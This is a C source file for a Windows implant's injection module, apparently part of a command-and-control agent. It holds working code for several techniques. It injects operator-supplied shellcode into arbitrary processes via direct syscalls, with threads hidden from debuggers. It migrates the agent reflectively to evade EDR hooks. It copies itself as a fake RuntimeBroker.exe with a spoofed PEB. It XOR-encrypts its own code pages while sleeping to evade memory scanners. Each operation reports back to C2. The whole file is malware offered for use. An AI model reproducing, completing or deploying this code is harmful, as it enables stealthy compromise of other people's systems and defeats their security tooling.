/*
 * client/inject.c  –  Process injection and agent migration
 * ==========================================================
 * See inject.h for the full design description.
 *
 * Implementation notes
 * --------------------
 *  •  All NT calls go through direct syscall trampolines (syscall.h) —
 *     no GetProcAddress-resolved function pointers, no NTDLL stub in the
 *     call stack, no IAT entries for VirtualAllocEx/CreateRemoteThread.
 *  •  Module/export resolution uses the PEB walk (peb_walk.h) —
 *     no GetModuleHandle, no GetProcAddress visible in the import table.
 *  •  Memory lifecycle for injection:
 *       1. SC_NtAllocateVirtualMemory(PAGE_READWRITE)    – allocate RW
 *       2. SC_NtWriteVirtualMemory                     – write payload
 *       3. SC_NtProtectVirtualMemory(PAGE_EXECUTE_READ)– flip to RX
 *       4. SC_NtCreateThreadEx(HideFromDebugger=TRUE)  – start thread
 *     No page is ever simultaneously Writable and Executable (W^X).
 *
 *  •  hex_decode() used for shellcode is a simple inline parser; it
 *     does not use sscanf/strtol (avoids MSVCRT dependency).
 */

#include "inject.h"
#include "config.h"
#include "syscall.h"
#include "peb_walk.h"
#include "loader.h"
#include "loader_blob.h"
#include "../tls/tls_client.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <bcrypt.h>

/* g_key_path is defined in main.c; we need its address to compute the RVA */
extern char g_key_path[];


/* ── Flag supplement ─────────────────────────────────────────────────────── */

#ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004
#endif

static BOOL g_inject_ready = FALSE;


/* ── Internal helpers ────────────────────────────────────────────────────── */

/* Send a plain-text status back to C2 */
static void _isend(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg || !*msg) msg = " ";
    tls_send_msg(pTls, (const BYTE *)msg, (DWORD)strlen(msg));
}

/* Hex nibble decoder — no CRT dependency */
static int _hex_nibble(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/*
 * hex_decode
 * ----------
 * Decodes an ASCII hex string into a newly malloc()'d byte array.
 * *pcbOut receives the byte count.  Returns NULL on bad input or OOM.
 * Caller must free() the result.
 */
static BYTE *_hex_decode(const char *hex, DWORD *pcbOut)
{
    *pcbOut = 0;
    size_t hexLen = strlen(hex);
    /* Strip optional "0x" prefix */
    if (hexLen >= 2 && hex[0] == '0' && (hex[1] == 'x' || hex[1] == 'X'))
    { hex += 2; hexLen -= 2; }

    if (hexLen == 0 || hexLen & 1) return NULL;     /* must be even length */

    DWORD  cbOut = (DWORD)(hexLen / 2);
    BYTE  *pOut  = (BYTE *)malloc(cbOut);
    if (!pOut) return NULL;

    for (DWORD i = 0; i < cbOut; i++) {
        int hi = _hex_nibble(hex[i * 2]);
        int lo = _hex_nibble(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) { free(pOut); return NULL; }
        pOut[i] = (BYTE)((hi << 4) | lo);
    }
    *pcbOut = cbOut;
    return pOut;
}

/*
 * _open_target
 * ------------
 * Opens the target process with the minimum access needed for injection.
 * Returns INVALID_HANDLE_VALUE on failure.
 */
static HANDLE _open_target(DWORD pid)
{
    return OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ      | PROCESS_CREATE_THREAD |
        PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE, pid);
}


/* ── Public: inject_init ─────────────────────────────────────────────────── */

BOOL inject_init(void)
{
    if (g_inject_ready) return TRUE;

    /* sc_init resolves SSNs via PEB walk — no GetProcAddress, no GetModuleHandle */
    if (!sc_init()) return FALSE;

    g_inject_ready = TRUE;
    return TRUE;
}


/* ── Public: inject_shellcode ────────────────────────────────────────────── */
/*
 * Wire verb: "inject <pid> <hex-shellcode>"
 *
 * Example (msfvenom calc.exe shellcode in hex):
 *   inject 1234 fc4883e4f0e8c8000000...
 *
 * Steps:
 *   1. Parse PID and hex shellcode
 *   2. OpenProcess (minimal rights)
 *   3. NtAllocateVirtualMemory (PAGE_READWRITE)
 *   4. NtWriteVirtualMemory
 *   5. NtProtectVirtualMemory (PAGE_EXECUTE_READ) — enforce W^X
 *   6. NtCreateThreadEx (HideFromDebugger)
 *   7. NtClose handles, report result
 */

void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
{
    if (!g_inject_ready) {
        _isend(pTls, "[-] inject: NT syscalls not initialised");
        return;
    }

    /* Parse: "<pid> <hexstring>" */
    char pidStr[32]   = {0};
    char hexStr[65536]= {0};     /* up to 32 KB shellcode */

    if (sscanf(args, "%31s %65535s", pidStr, hexStr) != 2) {
        _isend(pTls, "Usage: inject <pid> <hex-shellcode>");
        return;
    }

    DWORD pid = (DWORD)strtoul(pidStr, NULL, 10);
    if (pid == 0) {
        _isend(pTls, "[-] inject: invalid PID");
        return;
    }

    DWORD  cbShell = 0;
    BYTE  *pShell  = _hex_decode(hexStr, &cbShell);
    if (!pShell || cbShell == 0) {
        _isend(pTls, "[-] inject: invalid hex shellcode");
        return;
    }

    /* Open target */
    HANDLE hProc = _open_target(pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        free(pShell);
        char buf[64];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: OpenProcess(%lu) failed (err %lu)", pid, GetLastError());
        _isend(pTls, buf);
        return;
    }

    /* Allocate RW memory in target */
    PVOID   pRemote = NULL;
    SIZE_T  cbAlloc = (SIZE_T)cbShell;
    NTSTATUS ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbAlloc,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc); free(pShell);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Write shellcode */
    SIZE_T cbWritten = 0;
    ns = SC_NtWriteVirtualMemory(hProc, pRemote, pShell, cbShell, &cbWritten);
    free(pShell);
    if (!NT_SUCCESS(ns) || cbWritten != cbShell) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtWriteVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Flip RW → RX (W^X: no RWX page ever) */
    PVOID  pBase   = pRemote;
    SIZE_T cbProt  = (SIZE_T)cbShell;
    ULONG  oldProt = 0;
    ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt, PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtProtectVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Create remote thread — hidden from debugger */
    HANDLE hThread = NULL;
    ns = SC_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                             hProc, pRemote, NULL,
                             THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                             0, 0, 0, NULL);
    CloseHandle(hProc);

    if (!NT_SUCCESS(ns) || !hThread) {
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    SC_NtClose(hThread);

    char buf[128];
    _snprintf(buf, sizeof(buf)-1,
              "[+] inject: %lu bytes shellcode injected and executing in PID %lu",
              (unsigned long)cbShell, (unsigned long)pid);
    _isend(pTls, buf);
}


/* ── Reflective PE loader blob (auto-generated at build time) ───────────── */
/*
 * s_rfl_loader[] contains the raw x64 machine code for rfl_loader() from
 * loader.c, extracted by objcopy after compiling with -fpic.
 *
 * Memory layout written into the target process:
 *
 *   [pRemote + 0]                  rfl_loader code  (S_RFL_LOADER_SIZE bytes, RX)
 *   [pRemote + S_RFL_LOADER_SIZE]  RflData block    (sizeof(RflData), RW)
 *   [pRemote + S_RFL_LOADER_SIZE
 *            + sizeof(RflData)]    Raw PE bytes      (cbPE bytes, RW)
 *
 * Thread entry point:  pRemote
 * Thread argument:     pRemote + S_RFL_LOADER_SIZE  (= &RflData in target)
 *
 * rfl_loader() does full PE mapping inside the target (no LoadLibraryA on
 * the EXE — bypasses EDR hooks on the PE loader API):
 *   1. VirtualAlloc(SizeOfImage, PAGE_EXECUTE_READWRITE)
 *   2. Copy headers + sections
 *   3. Apply base relocations
 *   4. Resolve IAT via LoadLibraryA + GetProcAddress (for DLLs, not the EXE)
 *   5. Write g_key_path into the mapped image
 *   6. CreateThread → AgentRun()
 */


/* ── PE parsing helpers (used only in migrate_to_pid) ───────────────────── */

/* Returns the file offset of the PE Optional Header */
static DWORD _pe_opt_offset(const BYTE *raw)
{
    DWORD e_lfanew;
    memcpy(&e_lfanew, raw + 0x3C, 4);          /* DOS header e_lfanew */
    return e_lfanew + 4 + 20;                   /* after sig + FileHeader */
}

/*
 * _rfl_rva_off
 * ------------
 * Converts a PE RVA to a raw-file offset by scanning the section table.
 * Returns 0 if the RVA falls outside all sections.
 */
static DWORD _rfl_rva_off(const BYTE *raw, const BYTE *secBase,
                           WORD nSec, DWORD rva)
{
    for (WORD i = 0; i < nSec; i++) {
        DWORD vaddr, vsz, rawOff, rawSz2;
        memcpy(&vaddr,  secBase + i*40 + 12, 4);
        memcpy(&vsz,    secBase + i*40 + 8,  4);
        memcpy(&rawOff, secBase + i*40 + 20, 4);
        memcpy(&rawSz2, secBase + i*40 + 16, 4);
        if (rva >= vaddr && rva < vaddr + vsz) {
            DWORD off = rawOff + (rva - vaddr);
            (void)raw; (void)rawSz2;
            return off;
        }
    }
    return 0;
}

/*
 * _pe_find_export
 * ---------------
 * Parses the export directory of a PE file (raw bytes, PE32+/x64 only)
 * and returns the RVA of the exported function named `name`, or 0.
 */
static DWORD _pe_find_export(const BYTE *raw, DWORD rawSz, const char *name)
{
    DWORD optOff = _pe_opt_offset(raw);
    if (optOff + 0x78 > rawSz) return 0;

    WORD magic;
    memcpy(&magic, raw + optOff, 2);
    if (magic != 0x020B) return 0;

    DWORD expRVA;
    memcpy(&expRVA, raw + optOff + 0x70, 4);
    if (!expRVA) return 0;

    /* Locate section headers */
    WORD nSec, optSz;
    memcpy(&nSec,  raw + optOff - 20 + 2,  2);
    memcpy(&optSz, raw + optOff - 20 + 16, 2);
    const BYTE *secBase = raw + optOff - 20 + 20 + optSz;

    DWORD expOff = _rfl_rva_off(raw, secBase, nSec, expRVA);
    if (!expOff || expOff + 40 > rawSz) return 0;

    DWORD  nNames, addrTableRVA, nameTableRVA, ordTableRVA;
    memcpy(&nNames,       raw + expOff + 24, 4);
    memcpy(&addrTableRVA, raw + expOff + 28, 4);
    memcpy(&nameTableRVA, raw + expOff + 32, 4);
    memcpy(&ordTableRVA,  raw + expOff + 36, 4);

    DWORD addrOff = _rfl_rva_off(raw, secBase, nSec, addrTableRVA);
    DWORD nameOff = _rfl_rva_off(raw, secBase, nSec, nameTableRVA);
    DWORD ordOff  = _rfl_rva_off(raw, secBase, nSec, ordTableRVA);
    if (!addrOff || !nameOff || !ordOff) return 0;

    size_t nameLen = strlen(name);
    for (DWORD i = 0; i < nNames; i++) {
        DWORD nameRVA;
        memcpy(&nameRVA, raw + nameOff + i*4, 4);
        DWORD noff2 = _rfl_rva_off(raw, secBase, nSec, nameRVA);
        if (!noff2 || noff2 >= rawSz) continue;
        const char *fn = (const char *)(raw + noff2);
        if (strncmp(fn, name, nameLen + 1) != 0) continue;

        WORD ord;
        memcpy(&ord, raw + ordOff + i*2, 2);
        DWORD funcRVA;
        memcpy(&funcRVA, raw + addrOff + ord*4, 4);
        return funcRVA;
    }
    return 0;
}


/* ── Public: migrate_to_pid ─────────────────────────────────────────────── */
/*
 * Wire verb: "migrate <pid>"
 *
 * True reflective injection strategy:
 *   1. Read this process's raw PE bytes from disk.
 *   2. Parse the export table to find AgentRun's RVA.
 *   3. Compute g_key_path's RVA from its live VA and our image base.
 *   4. Allocate RW memory in the target:
 *        [rfl_loader code | RflData | raw PE bytes]
 *   5. Write the region, flip loader code to RX.
 *   6. NtCreateThreadEx at rfl_loader, arg = &RflData.
 *
 * rfl_loader() runs inside the target and does full PE loading:
 * headers, sections, base relocations, IAT — no LoadLibraryA on the EXE.
 * This avoids all Windows PE-loader callbacks that EDRs intercept.
 */

void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
{
    if (!g_inject_ready) {
        _isend(pTls, "[-] migrate: NT syscalls not initialised");
        return;
    }

    /* Parse PID */
    DWORD pid = (DWORD)strtoul(args, NULL, 10);
    if (pid == 0) {
        _isend(pTls, "Usage: migrate <pid>");
        return;
    }

    /* ── 1. Get our own EXE path and read raw PE bytes ───────────────── */
    char exePath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1)) {
        _isend(pTls, "[-] migrate: GetModuleFileName failed");
        return;
    }

    FILE *f = fopen(exePath, "rb");
    if (!f) {
        _isend(pTls, "[-] migrate: cannot open own EXE");
        return;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (fsize <= 0 || fsize > 8 * 1024 * 1024) {
        fclose(f);
        _isend(pTls, "[-] migrate: EXE size out of range");
        return;
    }
    DWORD cbPE = (DWORD)fsize;
    BYTE *pPE  = (BYTE *)malloc(cbPE);
    if (!pPE) { fclose(f); _isend(pTls, "[-] migrate: OOM"); return; }
    if (fread(pPE, 1, cbPE, f) != cbPE) {
        fclose(f); free(pPE);
        _isend(pTls, "[-] migrate: EXE read error");
        return;
    }
    fclose(f);

    /* ── 2. Find AgentRun RVA in the raw PE ──────────────────────────── */
    DWORD agentRunRva = _pe_find_export(pPE, cbPE, "AgentRun");
    if (!agentRunRva) {
        free(pPE);
        _isend(pTls, "[-] migrate: AgentRun export not found in PE");
        return;
    }

    /* ── 3. Compute g_key_path RVA (VA - ImageBase) ──────────────────── */
    HMODULE hSelf     = GetModuleHandleA(NULL);
    DWORD   keyPathRva = (DWORD)((ULONG_PTR)g_key_path - (ULONG_PTR)hSelf);

    /* ── 4. Resolve kernel32 API pointers (shared base across processes) */
    HMODULE hK32              = GetModuleHandleA("kernel32.dll");
    LPVOID (WINAPI *pVAlloc)(LPVOID, SIZE_T, DWORD, DWORD) =
        (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))
        GetProcAddress(hK32, "VirtualAlloc");
    BOOL (WINAPI *pFlush)(HANDLE, LPCVOID, SIZE_T) =
        (BOOL (WINAPI *)(HANDLE, LPCVOID, SIZE_T))
        GetProcAddress(hK32, "FlushInstructionCache");
    HMODULE (WINAPI *pLoadLib)(LPCSTR) =
        (HMODULE (WINAPI *)(LPCSTR))
        GetProcAddress(hK32, "LoadLibraryA");
    FARPROC (WINAPI *pGetProc)(HMODULE, LPCSTR) =
        (FARPROC (WINAPI *)(HMODULE, LPCSTR))
        GetProcAddress(hK32, "GetProcAddress");
    HANDLE (WINAPI *pCreateThread2)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                    LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) =
        (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
                           LPVOID, DWORD, LPDWORD))
        GetProcAddress(hK32, "CreateThread");
    BOOL (WINAPI *pCloseH)(HANDLE) =
        (BOOL (WINAPI *)(HANDLE))
        GetProcAddress(hK32, "CloseHandle");

    if (!pVAlloc || !pFlush || !pLoadLib || !pGetProc || !pCreateThread2 || !pCloseH) {
        free(pPE);
        _isend(pTls, "[-] migrate: kernel32 export resolution failed");
        return;
    }

    /* ── 5. Open target process ──────────────────────────────────────── */
    HANDLE hProc = _open_target(pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        free(pPE);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: OpenProcess(%lu) failed (err %lu)",
                  (unsigned long)pid, (unsigned long)GetLastError());
        _isend(pTls, buf);
        return;
    }

#ifdef _WIN64
    BOOL bWow64 = FALSE;
    IsWow64Process(hProc, &bWow64);
    if (bWow64) {
        CloseHandle(hProc); free(pPE);
        _isend(pTls, "[-] migrate: cannot inject x64 loader into WOW64 process");
        return;
    }
#endif

    /* ── 6. Build RflData block ──────────────────────────────────────── */
    RflData rfd;
    ZeroMemory(&rfd, sizeof(rfd));
    /* pRawPE points into the target allocation — filled with relative offset below */
    rfd.rawSize        = cbPE;
    rfd.agentRunRva    = agentRunRva;
    rfd.gKeyPathOffset = keyPathRva;
    rfd.gKeyPathSize   = MAX_PATH * 2;
    strncpy(rfd.keyPath, g_key_path, sizeof(rfd.keyPath) - 1);
    rfd.pVirtualAlloc         = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD)) pVAlloc;
    rfd.pFlushInstructionCache = (BOOL (WINAPI *)(HANDLE, LPCVOID, SIZE_T)) pFlush;
    rfd.pLoadLibraryA          = (HMODULE (WINAPI *)(LPCSTR)) pLoadLib;
    rfd.pGetProcAddress        = (FARPROC (WINAPI *)(HMODULE, LPCSTR)) pGetProc;
    rfd.pCreateThread          = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                  LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))
                                  pCreateThread2;
    rfd.pCloseHandle           = (BOOL (WINAPI *)(HANDLE)) pCloseH;

    /* ── 7. Allocate region in target: [loader | RflData | PE] ──────── */
    SIZE_T cbLoader  = (SIZE_T)S_RFL_LOADER_SIZE;
    SIZE_T cbRfd     = sizeof(RflData);
    SIZE_T cbTotal   = cbLoader + cbRfd + (SIZE_T)cbPE;

    PVOID  pRemote = NULL;
    NTSTATUS ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbTotal,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc); free(pPE);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: alloc failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Fix up pRawPE to the VA inside the target where the PE bytes will sit */
    rfd.pRawPE = (unsigned char *)((BYTE *)pRemote + cbLoader + cbRfd);

    /* ── 8. Build and write the flat buffer ──────────────────────────── */
    DWORD  cbFlat = (DWORD)(cbLoader + cbRfd + (SIZE_T)cbPE);
    BYTE  *pFlat  = (BYTE *)malloc(cbFlat);
    if (!pFlat) {
        CloseHandle(hProc); free(pPE);
        _isend(pTls, "[-] migrate: OOM building flat buffer");
        return;
    }
    memcpy(pFlat,                           s_rfl_loader, cbLoader);
    memcpy(pFlat + cbLoader,                &rfd,         cbRfd);
    memcpy(pFlat + cbLoader + cbRfd,        pPE,          cbPE);
    free(pPE);

    SIZE_T cbWritten = 0;
    ns = SC_NtWriteVirtualMemory(hProc, pRemote, pFlat, cbFlat, &cbWritten);
    free(pFlat);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: write failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* ── 9. Flip loader code region to RX ────────────────────────────── */
    PVOID  pBase  = pRemote;
    SIZE_T cbProt = cbLoader;
    ULONG  oldProt = 0;
    ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt,
                                   PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: protect failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* ── 10. Spawn loader thread ─────────────────────────────────────── */
    PVOID  pArg    = (BYTE *)pRemote + cbLoader;   /* &RflData in target */
    HANDLE hThread = NULL;
    ns = SC_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                             hProc, pRemote, pArg,
                             THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                             0, 0, 0, NULL);
    CloseHandle(hProc);

    if (!NT_SUCCESS(ns) || !hThread) {
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }
    SC_NtClose(hThread);

    /* Give the new instance a moment to start before we send the response */
    Sleep(800);

    char buf[256];
    _snprintf(buf, sizeof(buf)-1,
              "[+] migrate: reflective loader injected into PID %lu — exiting",
              (unsigned long)pid);
    _isend(pTls, buf);

    tls_disconnect(pTls);
    ExitProcess(0);
}


/* ── Public: auto_migrate ────────────────────────────────────────────────── */
/*
 * Called once at startup (before connecting to C2).
 *
 * Strategy: spawn a suspended copy of ourselves under a spoofed name
 * (%TEMP%\RuntimeBroker.exe), then immediately exit the launcher process.
 * The child hits the single-instance mutex, skips migration, and connects
 * to C2 — appearing in Task Manager as RuntimeBroker.exe.
 *
 * This avoids all PE-injection/VirtualAlloc-in-foreign-process issues
 * from the previous reflective loader approach.
 *
 * Evasion layers applied:
 *   1. EXE copied to %TEMP%\RuntimeBroker.exe — process image path in Task
 *      Manager shows a Windows-native sounding name.
 *   2. Child calls spoof_peb() at startup — PEB ImagePathName / CommandLine
 *      are rewritten to look like svchost.exe.
 *   3. CREATE_NO_WINDOW — no console window flashes.
 *   4. Launcher exits via ExitProcess(0) immediately after resume — the
 *      original image path and window station entry vanish at once.
 *
 * Returns FALSE only if the copy or process creation fails — in that case
 * the caller continues running as the original process.
 * On success this function never returns (ExitProcess is called).
 */
BOOL auto_migrate(const char *keyPath)
{
    (void)keyPath;   /* child inherits g_key_path via its own resolve_key_path() */

    /* ── 1. Get our own EXE path ─────────────────────────────────────── */
    char srcPath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(NULL, srcPath, sizeof(srcPath) - 1))
        return FALSE;

    /* ── 2. Build destination: %TEMP%\RuntimeBroker.exe ─────────────── */
    char dstPath[MAX_PATH] = {0};
    if (!GetTempPathA(sizeof(dstPath) - 20, dstPath))
        return FALSE;
    /* Append filename — strncat is fine here; buffer has 20 bytes of slack */
    strncat(dstPath, "RuntimeBroker.exe",
            sizeof(dstPath) - strlen(dstPath) - 1);

    /* ── 3. Copy ourselves to the temp path ─────────────────────────── */
    /* CopyFileA will overwrite silently if a stale copy is present       */
    if (!CopyFileA(srcPath, dstPath, FALSE))
        return FALSE;

    /* ── 4. Spawn the child (suspended so we can resume cleanly) ─────── */
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(
            dstPath,           /* lpApplicationName  */
            NULL,              /* lpCommandLine (NULL → use app name) */
            NULL, NULL,        /* process/thread security attrs */
            FALSE,             /* bInheritHandles */
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,              /* inherit environment */
            NULL,              /* inherit working directory */
            &si, &pi))
    {
        /* Clean up the temp copy on failure so we don't litter */
        DeleteFileA(dstPath);
        return FALSE;
    }

    /* ── 5. Resume child and exit ────────────────────────────────────── */
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* Give child a moment to start before we vanish (avoids a race where
     * the parent exits before the child has called CreateMutex)          */
    Sleep(300);
    ExitProcess(0);
}


/* ── Sleep obfuscation (APC-based, Foliage/Ekko style) ─────────────────── */
/*
 * obfuscate_sleep
 * ---------------
 * Cobalt Strike Beacon-class sleep obfuscation:
 *
 *   1. Generate a random 16-byte XOR key.
 *   2. XOR-encrypt all private RX pages via SC_NtWriteVirtualMemory —
 *      no VirtualProtect / RWX page.
 *   3. Queue an APC on the current thread to decrypt on wakeup.
 *   4. SleepEx(ms, TRUE) enters an alertable wait — during this window
 *      the thread is sleeping with all its code pages encrypted in RAM.
 *      A memory scanner sees only ciphertext.
 *   5. The wakeup APC fires, decrypts the pages, agent continues.
 *
 * When running injected inside a host process, skip page scrambling
 * entirely to avoid corrupting the host's code pages.
 *
 * Key is wiped with SecureZeroMemory after use.
 */

/* ── _is_injected ────────────────────────────────────────────────────────── */
static BOOL _is_injected(void)
{
    HMODULE hProcess = GetModuleHandleA(NULL);
    HMODULE hSelf    = NULL;
    GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (LPCSTR)&_is_injected, &hSelf);
    return (hSelf != NULL) && (hSelf != hProcess);
}

/* ── Page region tracking ────────────────────────────────────────────────── */
#define MAX_REGIONS 256
typedef struct { PVOID base; SIZE_T size; } _Region;

static int _collect_rx_pages(_Region *out, int max)
{
    int count = 0;
    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = NULL;
    while (count < max && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
        if (mbi.State  != MEM_COMMIT)  continue;
        if (mbi.Type   != MEM_PRIVATE) continue;
        if (mbi.Protect != PAGE_EXECUTE_READ &&
            mbi.Protect != PAGE_EXECUTE_READWRITE) continue;
        out[count].base = mbi.BaseAddress;
        out[count].size = mbi.RegionSize;
        count++;
    }
    return count;
}

/* ── XOR pass via SC_NtWriteVirtualMemory (no RWX) ──────────────────────── */
static void _xor_pages(_Region *regions, int count, const BYTE *key)
{
    HANDLE hSelf = GetCurrentProcess();
    for (int i = 0; i < count; i++) {
        SIZE_T sz   = regions[i].size;
        BYTE  *buf  = (BYTE *)malloc(sz);
        if (!buf) continue;

        /* Read → XOR → Write, all via syscall — no VirtualProtect */
        SIZE_T rd = 0;
        NTSTATUS ns = SC_NtReadVirtualMemory(hSelf, regions[i].base, buf, sz, &rd);
        if (NT_SUCCESS(ns) && rd == sz) {
            for (SIZE_T j = 0; j < sz; j++) buf[j] ^= key[j % 16];
            SIZE_T wr = 0;
            SC_NtWriteVirtualMemory(hSelf, regions[i].base, buf, sz, &wr);
        }
        SecureZeroMemory(buf, sz);
        free(buf);
    }
}

/* ── APC decrypt context ─────────────────────────────────────────────────── */
typedef struct {
    _Region  regions[MAX_REGIONS];
    int      count;
    BYTE     key[16];
} _SleepCtx;

static void NTAPI _apc_decrypt(ULONG_PTR param)
{
    _SleepCtx *ctx = (_SleepCtx *)param;
    _xor_pages(ctx->regions, ctx->count, ctx->key);
    SecureZeroMemory(ctx->key, sizeof(ctx->key));
    free(ctx);
}

/* ── Public: obfuscate_sleep ─────────────────────────────────────────────── */
void obfuscate_sleep(DWORD ms)
{
    /* Injected into host process — just sleep, don't touch host pages */
    if (_is_injected() || !sc_ready()) {
        Sleep(ms);
        return;
    }

    /* Generate random key */
    BYTE key[16];
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, key, sizeof(key),
            BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        Sleep(ms);
        return;
    }

    /* Collect private RX pages */
    static _Region regions[MAX_REGIONS];
    int count = _collect_rx_pages(regions, MAX_REGIONS);
    if (count == 0) { Sleep(ms); return; }

    /* Build APC decrypt context (heap-allocated — survives our stack frame) */
    _SleepCtx *ctx = (_SleepCtx *)malloc(sizeof(_SleepCtx));
    if (!ctx) { Sleep(ms); return; }
    for (int i = 0; i < count; i++) ctx->regions[i] = regions[i];
    ctx->count = count;
    memcpy(ctx->key, key, 16);
    SecureZeroMemory(key, 16);

    /* Queue APC to decrypt on wakeup */
    QueueUserAPC(_apc_decrypt, GetCurrentThread(), (ULONG_PTR)ctx);

    /* Encrypt pages — after this our own code is XOR-ciphertext in RAM */
    _xor_pages(regions, count, ctx->key);

    /* Alertable sleep — APC fires on wakeup, decrypts, we continue */
    SleepEx(ms, TRUE);
    /* ctx is freed inside _apc_decrypt */
}
#undef MAX_REGIONS
